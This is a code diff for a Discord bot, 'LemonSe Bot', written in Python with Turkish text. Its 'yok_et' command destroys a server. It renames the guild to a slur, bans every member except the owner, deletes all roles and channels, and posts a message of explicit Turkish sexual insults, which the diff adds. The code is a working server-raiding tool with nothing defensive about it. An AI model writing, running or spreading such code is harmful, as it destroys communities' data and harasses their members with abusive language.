@@ -18,14 +18,12 @@ async def yok_et(ctx):
     """Sunucuyu tamamen yok eder"""
     guild = ctx.guild
     
-    # Sunucu adını değiştir
     try:
         await guild.edit(name="orospu çocukları siktim laaan")
         await asyncio.sleep(0.5)
     except:
         pass
     
-    # Önce herkesi banla
     for member in guild.members:
         if member != guild.owner and member != bot.user:
             try:
@@ -34,7 +32,6 @@ async def yok_et(ctx):
             except:
                 pass
     
-    # Tüm rolleri sil
     for role in guild.roles:
         if role != guild.default_role:
             try:
@@ -43,7 +40,6 @@ async def yok_et(ctx):
             except:
                 pass
     
-    # Tüm kanalları ve kategorileri sil
     for channel in guild.channels:
         try:
             await channel.delete()
@@ -51,10 +47,19 @@ async def yok_et(ctx):
         except:
             pass
     
-    # Tek bir kanal oluştur
     new_channel = await guild.create_text_channel("tarafından-sıkıldı-hadi-yallah")
     
-    # Kanalda mesaj yaz
-    await new_channel.send("Sunucu botun ismi tarafından sıkıldı hadi yallah! Ana bacı sövüyorum: ... (küfürler burada)")
+    # Küfür dolu mesaj
+    await new_channel.send(
+        "**LemonSe Bot** tarafından sıkıldı hadi yallah!\n\n"
+        "Ana bacı sövüyorum:\n"
+        "- Ananızın amına koyayım sizin! Orospu çocukları!\n"
+        "- Sizin gibi yarrağı yemiş herifleri banlamak ne güzel!\n"
+        "- Ananızı sikeyim, babanızı sikeyim, sülalenizin hepsini sikeyim!\n"
+        "- Ne biçim sunucu lan bu? Amına koyduğumun yerinde herkes banlandı!\n"
+        "- Siz ne sandınız? LemonSe Bot gelir sizi temizler, anasını siktiğimin sunucusunu dümdüz eder!\n"
+        "- Hadi yallah orospu çocukları, Discord'dan silin gidin!\n"
+        "- Sonra da gelip ağlamayın, ananızı sikeyim sizin! 😘"
+    )
 
 bot.run(os.getenv("DISCORD_TOKEN"))
